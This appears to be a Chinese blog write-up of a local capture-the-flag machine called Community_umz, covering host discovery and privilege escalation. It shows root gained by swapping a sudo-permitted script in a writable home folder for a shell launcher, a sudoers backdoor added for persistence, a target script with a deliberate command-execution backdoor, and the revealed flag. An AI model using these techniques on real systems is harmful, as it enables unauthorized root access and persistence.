---
{"dg-publish":true,"title":"Community_umz","tags":["blog"],"dg-path":"安全/靶机/Community_umz.md","permalink":"/安全/靶机/Community_umz/","dgPassFrontmatter":true}
---

# 主机发现

```sh
┌──(root㉿kali)-[~]
└─# arp-scan --interface=eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 00:0c:29:8e:b5:fe, IPv4: 192.168.196.4
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.196.2   00:50:56:e9:2d:a9       VMware, Inc.
192.168.196.1   00:50:56:c0:00:08       VMware, Inc.
192.168.196.3   00:50:56:c0:00:08       VMware, Inc.
192.168.196.143 08:00:27:c7:b1:fb       PCS Systemtechnik GmbH
192.168.196.254 00:50:56:f2:cb:8c       VMware, Inc.

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.703 seconds (94.71 hosts/sec). 5 responded

```

```sh
┌──(root㉿kali)-[~]
└─# nmap -sT -min-rate 10000 -p- 192.168.196.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-14 23:03 EST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.196.143
Host is up (0.0084s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 08:00:27:C7:B1:FB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 74.00 seconds

```

就一个ssh，那就直接提权吧

![Pasted image 20250215120352.png](/img/user/picture/Pasted%20image%2020250215120352.png)

# 提权


```sh
jan:~$ sudo -l
[sudo] password for welcome:
User welcome may run the following commands on jan:
    (root) PASSWD: /bin/ls
    (root) PASSWD: /opt/check_flag
    (root) PASSWD: /home/welcome/get_flag
jan:~$ ls
get_flag  note.txt
jan:~$ ls -l ../
total 4
drwxr-sr-x    2 welcome  welcome       4096 Feb 15 04:13 welcome


```

那我们直接替换一下`/home/welcome/get_flag`

```sh
jan:~$ mv get_flag 0_get_flag
jan:~$ ls
0_get_flag  note.txt

```
之后新建一个`get_flag`
```sh
#!/bin/sh

exec /bin/sh

```

```sh
/home/welcome # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

先加一个后门
```sh
/home/welcome # ls -l /etc/sudoers
-r--r-----    1 root     root           156 Feb 14 04:41 /etc/sudoers
/home/welcome # chmod +w /etc/sudoers
/home/welcome # ls -l /etc/sudoers
-rw-r-----    1 root     root           156 Feb 14 04:41 /etc/sudoers
/home/welcome # nano /etc/sudoers
/home/welcome # cat /etc/sudoers

root ALL=(ALL:ALL) ALL
welcome ALL=PASSWD:/bin/ls
welcome ALL=PASSWD:/opt/check_flag
welcome ALL=PASSWD:/home/welcome/get_flag

@includedir /etc/sudoers.d

welcome ALL=(ALL:ALL) ALL

```


```sh
~ # ls -al
total 12
drwx------    2 root     root          4096 Feb 14 03:52 .
drwxr-xr-x   21 root     root          4096 Jan 28 09:01 ..
lrwxrwxrwx    1 root     root             9 Jan 28 09:26 .ash_history -> /dev/null
-rw-------    1 root     root           121 Feb 14 04:39 root.txt
~ # cat root.txt
it is a fake flag .
maybe you can't find flag .
it means you break the machine.
please delete machine and re-import it .

```
emmmm,flag不在这？

看一下`check_flag`是什么东西
```sh
/opt # cat check_flag
#!/bin/sh
echo "please input flag."
read -p ">>> " a

flag=$(cat /home/welcome/get_flag 2>/dev/null|grep '# flag' -A 1|tail -1|awk -F"'" '{print $2}')

if [[ "$a" == "$flag" ]];then
        echo "ok"
else
        echo "not ok"

        #backdoor
        exec $a &>/dev/null

fi

```

```sh
/opt # cat /home/welcome/get_flag 2>/dev/null|grep '# flag' -A 1|tail -1|awk -F"'" '{print $2}'
flag{fc8941b9088096e99b635cc3e07080d6}

/opt # ./check_flag
please input flag.
>>> flag{fc8941b9088096e99b635cc3e07080d6}
ok

```

应该就是这么回事吧

```sh
jan:~$ sudo cat get_flag
#!/bin/sh

a=$((RANDOM%100))
b=$((RANDOM%100))

for i in $(seq $a)
do
    echo "flag{$(head /dev/random |md5sum|awk '{print $1}')}"
done

# flag
echo 'flag{fc8941b9088096e99b635cc3e07080d6}'

for i in $(seq $b)
do
    echo "flag{$(head /dev/random |md5sum|awk '{print $1}')}"
done

```






